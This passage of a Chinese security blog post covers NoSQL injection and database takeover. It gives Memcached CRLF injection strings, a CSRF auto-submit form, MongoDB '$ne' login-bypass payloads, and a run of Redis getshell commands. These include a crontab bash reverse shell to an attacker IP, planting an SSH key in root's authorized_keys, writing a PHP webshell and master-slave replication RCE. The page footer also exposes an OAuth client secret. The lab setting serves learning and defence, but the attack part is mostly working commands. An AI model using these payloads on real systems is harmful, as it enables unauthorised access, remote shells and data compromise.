<p>该驱动程序未能针对带有回车\r(0x0D)和换行的\n(0x0A)的ASCII码采取措施,导致攻击者有机会注入包含有键参数的新命令行和其他非计划内的命令到缓存中8。如下代码,其中的$param是用户输入并作为键来作用：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">$memcached=new Memcached(); $memcached -&gt;addServer('localhost',11211); $memcached-&gt;set($param, "some value");</span><br></pre></td></tr></tbody></table></figure>

<p>攻击者可以提供以下输入进行注入攻击：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">"key1 0 3600 4\r\nabcd\r\nset key2 0 3600 4\r\ninject\r\n"</span><br></pre></td></tr></tbody></table></figure>

<p>增加到数据库中的第一个键是具有”some value”值的key1。攻击者可以增加其他的、非计划内的键到数据库中,即带有”inject”值的key2。这种注入也可以发生在get命令上。看一下Memcached主页上的示例,它以这三行开头：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Function get_foo(foo_id) foo = memcached_get("foo: " . foo_id) return foo if defined foo</span><br></pre></td></tr></tbody></table></figure>

<p>这个示例展示了Memcached的典型用法,在处理输入之前首先检查在数据库中是不是已经存在了。假设用类似代码检查从用户那里接收的认证令牌,验证他们是不是登录过了,那么就可以通过传递以下作为令牌的字符串来利用它:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">"random_token\r\nset my_crafted_token 0 3600 4\r\nroot\r\n"</span><br></pre></td></tr></tbody></table></figure>

<p>当这个字符串作为令牌传递时,数据库将检查这个”random_token”是否存在,然后将添加一个具有”root”值的”my_crafted_token”。之后,攻击者就可以发送具有root身份的my_crafted_token令牌了。<br>可以被这项技术攻击的其他指令还有：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">incr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">decr &lt;Key&gt; &lt;Amount&gt;</span><br><span class="line">delete &lt;Key&gt;</span><br></pre></td></tr></tbody></table></figure>

<p>在此,incr用于增加一个键的值,decr用于缩减一个键的值,以及delete用于删除一个键。攻击者也可以用像set和get函数一样的手段来使用带来自己键参数的这三个函数。攻击者可以使用多条目函数进行同样的注入：deleteMulti、getMulti和setMulti,其中每一个键字段都可以被注入。回车换行注入可以被用于连接多个get请求。在一项我们进行的测试中,包括原始get在内最多可以连接17条。这样注入返回的结果是第一个键及其相应的值。</p>
<h4 id="6、跨域违规"><a href="#6、跨域违规" class="headerlink" title="6、跨域违规"></a>6、跨域违规</h4><p>NoSQL数据库的另一个常见特点是，他们能够常常暴露能够从客户端应用进行数据库查询的HTTP REST API。暴露REST API 的数据库包括MongoDB、CouchDB和HBase。暴露REST API 就直接把数据库暴露给应用了，甚至是仅基于HTML5的应用，因为它不再需要间接的驱动程序了，让任何编程语言都可以在数据库上执行HTTP查询。这么做的优势非常明显，但这一特点是否伴随着安全风险？我们的回答是肯定的：这种REST API给跨站点请求伪造（CSRF）暴露了数据库，让攻击者绕过了防火墙和其他外围防御。</p>
<p>HTTP REST APIs是NoSQL数据库中的一个流行模块，然而，它们引入了一类新的漏洞，它甚至能让攻击者从其他域攻击数据库。在跨域攻击中，攻击者利用合法用户和他们的网页浏览器执行有害的操作。是一种跨站请求伪造（CSRF）攻击形式的违规行为，在此网站信任的用户浏览器将被利用在NoSQL数据库上执行非法操作。通过把HTML格式的代码注入到有漏洞的网站或者欺骗用户进入到攻击者自己的网站上，攻击者可以在目标数据库上执行post动作，从而破坏数据库。</p>
<p>现在让我们看看CSRF攻击是如何使用这个函数增加新文件到管理员集合中的，从而在hr数据库（它被认为处于安全的内部网络中）中增加了一个新的管理员用户，如图5所示。若想攻击成功，必须要满足几个条件。首先，攻击者必须能操作一个网站，要么是他们自己的网站，要么是利用不安全的网站。攻击在该网站放置一个HTML表单以及一段将自动提交该表单的脚本，比如：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">&lt;form action=" http://safe.internal. db/hr/admins/_insert" method="POST" name="csrf"&gt;</span><br><span class="line">&lt;input type="text" name="docs" value=" [{"username":attacker}]" /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt; document.forms[0].submit(); &lt;/script&gt;</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo4rz979kj30wg0l8k5n.jpg" alt="image-20200712133641169"></p>
<p>藏在防火墙后的内部网络内的用户被欺骗访问一个恶意外部网页，这将导致在内部网络的NoSQL数据库的 REST API 上执行非预期的查询。</p>
<p>第二，攻击者必须通过网络诱骗或感染用户经常访问的网站欺骗用户进入被感染的网站。最后，用户必须许可访问Mongoose HTTP接口。</p>
<p>用这种方式，攻击者不必进入内部网络即可执行操作，在本例中，是插入新数据到位于内部网络中的数据库中。这种攻击执行很简单，但要求攻击者要提前侦察去识别主机、数据库名称，等等。</p>
<h4 id="7、node-js注入-靶场"><a href="#7、node-js注入-靶场" class="headerlink" title="7、node.js注入(靶场)"></a>7、node.js注入(靶场)</h4><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">靶场下载地址：https://github.com/Charlie-belmer/vulnerable-node-app</span><br><span class="line">环境：node.js、Mongodb</span><br><span class="line">进入APP目录下使用命令: node server.js启动环境</span><br><span class="line">PS：若提示错误，使用npm install 下载报错模块</span><br></pre></td></tr></tbody></table></figure>

<h5 id="登录绕过"><a href="#登录绕过" class="headerlink" title="登录绕过"></a>登录绕过</h5><p>此页面注入可使用重言式进行绕过登录</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggntfjlv2qj311m0mqgoh.jpg" alt="image-20200712070413889"></p>
<p>使用burp抓包，如下图</p>
<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1f0fqb7j30rh0b3gn8.jpg" alt="image-20200710180920921"></h4><p>payload</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">修改password</span><br><span class="line">	{"username":"admin","password":{"$ne":1}}</span><br><span class="line">修改</span><br><span class="line">	{"username":{"$ne":1},"password":{"$ne":1}}</span><br><span class="line">都可绕过账户密码登录</span><br></pre></td></tr></tbody></table></figure>

<p>注入成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggm1g72jkej30rl09vgn8.jpg" alt="image-20200710181032327"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu5bax01j31jg0ikwj6.jpg" alt="image-20200712072859566"></p>
<h5 id="where注入"><a href="#where注入" class="headerlink" title="where注入"></a>where注入</h5><p>此页面类似联合查询注入</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnu6wbltbj31n80mitcc.jpg" alt="image-20200712073030844"></p>
<p>注入恶意代码使得表达式为真来获取所有用户名</p>
<p>payload</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">username=' || '1'=='1</span><br><span class="line"></span><br><span class="line">根据用户输入程序构造如下代码，带入数据库查询后返回所有用户信息</span><br><span class="line">’$where‘:’this.username‘ == '' || '1'=='1'</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggnue2b1smj329t0u0qab.jpg" alt="image-20200712073723584"></p>
<h3 id="0x03-NoSQL数据库GETSHELL方法"><a href="#0x03-NoSQL数据库GETSHELL方法" class="headerlink" title="0x03 NoSQL数据库GETSHELL方法"></a>0x03 NoSQL数据库GETSHELL方法</h3><p>老生常谈，其实网上有很多关于Redis或Mongodb的漏洞利用方法，不过本文既然是讲NoSQL，Redis和Mongodb算是NoSQL数据库中的代表性数据库，所以本文也总结一下利用方法。</p>
<h4 id="Redis-getshell方法总结"><a href="#Redis-getshell方法总结" class="headerlink" title="Redis getshell方法总结"></a>Redis getshell方法总结</h4><p>环境搭建</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">下载：wget http://download.redis.io/releases/redis-4.0.9.tar.gz</span><br><span class="line">解压：tar -zxvf redis-4.0.9.tar.gz</span><br><span class="line">cd redis-4.0.9</span><br><span class="line">make</span><br><span class="line">make test</span><br><span class="line">make install</span><br><span class="line">依次执行</span><br><span class="line"></span><br><span class="line">配置redis.conf</span><br><span class="line">注释 bind 127.0.0.1</span><br><span class="line">关闭保护模式，将protected-mode yes改为no</span><br></pre></td></tr></tbody></table></figure>

<p>未授权连接</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">redis-cli -h 0.0.0.0 -p 6379 连接上靶机</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0hlawcxj315w0pk775.jpg" alt="image-20200712110823533"></p>
<h5 id="crontab-计划任务"><a href="#crontab-计划任务" class="headerlink" title="crontab-计划任务"></a>crontab-计划任务</h5><p>本机监听</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">nc -lvvp 4444</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ji6dacj30ro07wjrn.jpg" alt="image-20200712111013635"></p>
<p>redis</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">set x "\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.239.136/8888 0&gt;&amp;1\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0ils1rhj323s0g8gtz.jpg" alt="image-20200712110920900"></p>
<p>接收到反弹shell</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0u4fj3hj30w40u0tfb.jpg" alt="image-20200712112025614"></p>
<h5 id="ssh-keygen"><a href="#ssh-keygen" class="headerlink" title="ssh-keygen"></a>ssh-keygen</h5><p>本地生成秘钥</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">cd .ssh</span><br><span class="line">ssh-keygen -t rsa</span><br><span class="line">(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt</span><br><span class="line">cat foo.txt | redis-cli -h  192.168.239.129 -x set crackit</span><br></pre></td></tr></tbody></table></figure>

<p>redis</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir /root/.ssh/</span><br><span class="line">config get dir</span><br><span class="line">config set dbfilename "authorized_keys"</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">最后本机运行</span><br><span class="line">ssh -i id_rsa root@x.x.x.x</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo0dm7g43j32740sun4e.jpg" alt="image-20200712110433966"></p>
<h5 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">redis-cli -h  192.168.239.129</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x "&lt;?php phpinfo();?&gt;"</span><br><span class="line">save</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo18p96skj30ue092jsd.jpg" alt="image-20200712113426626"></p>
<p>写入成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo192t9zxj31m60u079y.jpg" alt="image-20200712113446908"></p>
<h5 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h5><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">so文件：git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand(下载后进入目录make，获取恶意so文件)</span><br><span class="line">python脚本：git clone https://github.com/Ridter/redis-rce.git</span><br><span class="line"></span><br><span class="line">执行命令：python3 redis-rce.py -r 192.168.239.129 -p 6379 -L 192.168.239.136 -f module.so</span><br></pre></td></tr></tbody></table></figure>

<p>成功获取shell</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggo2c4z28qj31780u07b9.jpg" alt="image-20200712121220182"></p>
<h4 id="MongoDB未授权访问"><a href="#MongoDB未授权访问" class="headerlink" title="MongoDB未授权访问"></a>MongoDB未授权访问</h4><p>目标机：ubuntu</p>
<p>攻击机：kali</p>
<p>使用docker搭建漏洞环境</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">拉取环境</span><br><span class="line">	sudo docker pull mongo</span><br><span class="line">查看镜像</span><br><span class="line">	sudo docker images</span><br><span class="line">启动容器</span><br><span class="line">	sudo docker run -d -p 27017:27017 --name mongodb mongo</span><br><span class="line">查看mongodb容器IP</span><br><span class="line">	sudo $docker inspect mongodb | grep IPAddress</span><br><span class="line">映射docker mongodb 27917端口到本机27917端口上</span><br><span class="line">	sudo iptables -t nat -A DOCKER -p tcp --dport 27917 -j DNAT --to-destination 172.17.0.2:27017</span><br></pre></td></tr></tbody></table></figure>

<p>nmap扫描</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxb3t0dfj31100aw75k.jpg" alt="image-20200714233501502"></p>
<p>至此，漏洞环境搭建成功</p>
<p>使用metasploit扫描漏洞是否存在</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">扫描模块</span><br><span class="line">	auxiliary/scanner/mongodb/mongodb_login</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggqxx5fpgqj31v00jk451.jpg" alt="image-20200714235614189"></p>
<p>使用Mongodb连接工具</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">下载地址：https://nosqlbooster.com/downloads</span><br></pre></td></tr></tbody></table></figure>

<p>输入靶机IP，连接即可</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyew6oyvj314y0oatcu.jpg" alt="image-20200715001317487"></p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyee7jevj31bo0u07hm.jpg" alt="image-20200715001247581"></p>
<p>连接成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggqyg2p0zgj31e00u0qay.jpg" alt="image-20200715001424500"></p>
<h4 id="Memcached未授权访问"><a href="#Memcached未授权访问" class="headerlink" title="Memcached未授权访问"></a>Memcached未授权访问</h4><p>目标机:Centos7</p>
<p>环境搭建</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">安装：</span><br><span class="line">	sudo yum install memcached</span><br><span class="line">启动服务</span><br><span class="line">	sudo memcached -d -m 128 -p 11211 -u root</span><br><span class="line">查看是否启动服务</span><br><span class="line">	sudo ps -ef | grep memcache</span><br><span class="line">安装客户端</span><br><span class="line">	sudo yum install php-memcached</span><br><span class="line">重启apache服务</span><br><span class="line">	service apache2 restart</span><br><span class="line">查看端口开放</span><br><span class="line">	netstat -an |more</span><br></pre></td></tr></tbody></table></figure>

<p>当显示如下图，漏洞环境搭建成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2g3lpqbj31420m4tas.jpg" alt="image-20200715231820276"></p>
<p>漏洞利用</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">telnet 192.168.239.137 11211</span><br></pre></td></tr></tbody></table></figure>

<p>成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlly1ggs2i2rhykj31420iamya.jpg" alt="image-20200715232019503"></p>
<h4 id="CouchDB未授权访问"><a href="#CouchDB未授权访问" class="headerlink" title="CouchDB未授权访问"></a>CouchDB未授权访问</h4><p>目标机：Kali</p>
<p>环境搭建</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">wget https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/docker-compose.yml</span><br><span class="line"></span><br><span class="line">下载环境并启动</span><br><span class="line">	docker-compose up -d</span><br></pre></td></tr></tbody></table></figure>

<p>如果访问不了网址,新建docker-compose.yml，将如下代码复制进去即可</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">version: '2'</span><br><span class="line">services:</span><br><span class="line">  couchdb:</span><br><span class="line">    image: vulhub/couchdb:1.6.0 </span><br><span class="line">    ports:</span><br><span class="line">      - "5984:5984"</span><br></pre></td></tr></tbody></table></figure>

<p>环境搭建成功</p>
<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6qhomutj31qw0dm0u1.jpg" alt="image-20200716223216594"></p>
<p>漏洞利用</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">http://192.168.239.129:5984/_config				//网址后面加上_config，出现如下图说明存在漏洞</span><br></pre></td></tr></tbody></table></figure>

<p><img src="https://tva1.sinaimg.cn/large/007S8ZIlgy1ggt6r4c6f3j31if0u07bd.jpg" alt="image-20200716223254136"></p>
<h3 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h3><p>本文大概介绍了NoSQL注入的分类，主要讲的是MongoDB数据库注入，背负式和跨域违规，网上资料算是极少，只能从其他文章中摘录放到本文章内。</p>
<p>不管是SQL注入还是Nosql注入，漏洞产生原因都是未对用户输入的数据进行过滤或过滤不严谨，虽然NoSQL不使用SQL语句，但可根据程序语言来进行注入，不管是PHP，Node.JS或其他语言，没有做好数据过滤照样存在注入，果然世上没有绝对安全的应用，别问，问就是研究的不够深。</p>
<h3 id="0x05-参考链接"><a href="#0x05-参考链接" class="headerlink" title="0x05 参考链接"></a>0x05 参考链接</h3><p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/25fb182ef52c">https://www.jianshu.com/p/25fb182ef52c</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase">https://blog.csdn.net/qq_27446553/article/details/79379481?utm_medium=distribute.pc_aggpage_search_result.none-task-blog-2~all~baidu_landing_v2~default-1-79379481.nonecase</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1602092">https://cloud.tencent.com/developer/article/1602092</a></p>
<p><a target="_blank" rel="noopener" href="https://nullsweep.com/a-nosql-injection-primer-with-mongo/">https://nullsweep.com/a-nosql-injection-primer-with-mongo/</a></p>
<p><a target="_blank" rel="noopener" href="https://scotch.io/@401/mongodb-injection-in-nodejs">https://scotch.io/@401/mongodb-injection-in-nodejs</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Time</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://timeshu.github.io/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">https://timeshu.github.io/2020/06/23/NoSql%E6%95%B0%E6%8D%AE%E5%BA%93getShell%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://TimeSHU.github.io" target="_blank">Time'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/06/27/jwt%E5%AD%A6%E4%B9%A0/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">jwt学习</div></div></a></div><div class="next-post pull-right"><a href="/2020/06/22/xyhcms%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">xyhcms审计学习</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="gitalk-container"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">0x00 背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-NoSQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%89%B9%E6%80%A7"><span class="toc-number">2.</span> <span class="toc-text">0x01 NoSQL数据库特性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-Nosql%E6%95%B0%E6%8D%AE%E5%BA%93%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">0x02 Nosql数据库注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E9%87%8D%E8%A8%80%E5%BC%8F"><span class="toc-number">3.1.</span> <span class="toc-text">1、重言式</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.2.</span> <span class="toc-text">2、联合查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81JavaScript%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.</span> <span class="toc-text">3、JavaScript注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.4.</span> <span class="toc-text">4、盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E8%83%8C%E8%B4%9F%E5%BC%8F%E6%9F%A5%E8%AF%A2"><span class="toc-number">3.5.</span> <span class="toc-text">5、背负式查询</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81%E8%B7%A8%E5%9F%9F%E8%BF%9D%E8%A7%84"><span class="toc-number">3.6.</span> <span class="toc-text">6、跨域违规</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81node-js%E6%B3%A8%E5%85%A5-%E9%9D%B6%E5%9C%BA"><span class="toc-number">3.7.</span> <span class="toc-text">7、node.js注入(靶场)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87"><span class="toc-number">3.7.1.</span> <span class="toc-text">登录绕过</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link"><span class="toc-number">3.8.</span> <span class="toc-text"></span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#where%E6%B3%A8%E5%85%A5"><span class="toc-number">3.8.1.</span> <span class="toc-text">where注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-NoSQL%E6%95%B0%E6%8D%AE%E5%BA%93GETSHELL%E6%96%B9%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">0x03 NoSQL数据库GETSHELL方法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Redis-getshell%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93"><span class="toc-number">4.1.</span> <span class="toc-text">Redis getshell方法总结</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#crontab-%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">4.1.1.</span> <span class="toc-text">crontab-计划任务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh-keygen"><span class="toc-number">4.1.2.</span> <span class="toc-text">ssh-keygen</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E5%85%A5webshell"><span class="toc-number">4.1.3.</span> <span class="toc-text">写入webshell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6RCE"><span class="toc-number">4.1.4.</span> <span class="toc-text">利用主从复制RCE</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MongoDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">4.2.</span> <span class="toc-text">MongoDB未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Memcached%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">4.3.</span> <span class="toc-text">Memcached未授权访问</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CouchDB%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">4.4.</span> <span class="toc-text">CouchDB未授权访问</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">0x04 总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-number">6.</span> <span class="toc-text">0x05 参考链接</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background-image: url('https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2019 - 2022 By Time</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://timeshu.github.io">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="放大字体"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="缩小字体"><i class="fas fa-minus"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><div class="js-pjax"><script>function addGitalkSource () {
  const ele = document.createElement('link')
  ele.rel = 'stylesheet'
  ele.href= 'https://cdn.jsdelivr.net/npm/gitalk/dist/gitalk.min.css'
  document.getElementsByTagName('head')[0].appendChild(ele)
}

function loadGitalk () {
  function initGitalk () {
    var gitalk = new Gitalk(Object.assign({
      clientID: '7296bb0c658f7e8397b9',
      clientSecret: 'f7701c96a690160dfb9a85fcc00e6ce7bc03a971',
      repo: 'blog-comments',
      owner: 'TimeSHU',
      admin: ['TimeSHU'],
      id: '2b4598a00fb10373ce0716a941d51abf',
      language: 'zh-CN',
      perPage: 10,
      distractionFreeMode: false,
      pagerDirection: 'last',
      createIssueManually: false,
      updateCountCallback: commentCount
    },null))

    gitalk.render('gitalk-container')
  }

  if (typeof Gitalk === 'function') initGitalk()
  else {
    addGitalkSource()
    getScript('https://cdn.jsdelivr.net/npm/gitalk@latest/dist/gitalk.min.js').then(initGitalk)
  }
}

function commentCount(n){
  let isCommentCount = document.querySelector('#post-meta .gitalk-comment-count')
  if (isCommentCount) {
    isCommentCount.innerHTML= n
  }
}

if ('Gitalk' === 'Gitalk' || !false) {
  if (false) btf.loadComment(document.getElementById('gitalk-container'), loadGitalk)
  else loadGitalk()
} else {
  function loadOtherComment () {
    loadGitalk()
  }
}</script></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>